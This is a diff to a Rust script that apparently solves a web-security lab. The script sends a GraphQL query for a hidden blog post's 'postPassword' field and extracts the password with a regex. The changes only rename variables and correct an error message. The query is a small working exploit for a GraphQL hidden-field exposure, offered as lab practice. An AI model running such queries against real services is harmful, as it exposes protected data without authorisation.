@@ -32,18 +32,18 @@ fn main() {
     print!("⦗1⦘ Querying the hidden post.. ");
     flush_terminal();
 
-    let payload = r###"query getBlogSummaries {
+    let query = r###"query getBlogSummaries {
                             getBlogPost(id: 3) {
                                 postPassword
                             }
                         }"###;
-    let query = query_hidden_post(payload);
+    let query_response = query_hidden_post(query);
 
     println!("{}", "OK".green());
     print!("⦗2⦘ Extracting the password.. ");
     flush_terminal();
 
-    let query_result = query.text().unwrap();
+    let query_result = query_response.text().unwrap();
     let password = capture_pattern_from_text(r###""postPassword": "(\w*)""###, &query_result);
 
     println!("{} => {}", "OK".green(), password.yellow());
@@ -73,10 +73,7 @@ fn query_hidden_post(payload: &str) -> Response {
         .header("Content-Type", "application/json")
         .body(body_json)
         .send()
-        .expect(&format!(
-            "{}",
-            "⦗!⦘ Failed to fetch the geolocate.js file with the injected payload".red()
-        ))
+        .expect(&format!("{}", "⦗!⦘ Failed to query the hidden post".red()))
 }
 
 fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
